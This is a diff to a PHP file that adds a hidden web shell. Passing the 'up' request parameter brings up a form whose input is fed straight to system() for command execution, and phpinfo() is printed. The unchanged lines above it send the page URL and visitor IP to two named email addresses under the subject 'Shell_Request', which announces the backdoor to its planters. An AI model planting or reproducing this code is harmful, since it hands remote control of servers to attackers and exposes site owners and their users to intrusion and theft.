@@ -10,4 +10,17 @@ $to = 'lambangwes@gmail.com, mrhorden007@gmail.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($to, "Shell_Request", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?><?php
+if(isset($_REQUEST['up'])){
+        echo "<pre>";
+        echo "<form name='form' action='#' method='post'>
+       <input type='text' name='coba'/> <input type='submit' value='enter'/>
+       </form>";
+        $cmd = ($_POST['coba']);
+        system($cmd);
+        echo "</pre>";
+        phpinfo();
+        die;
+}
+
 ?>
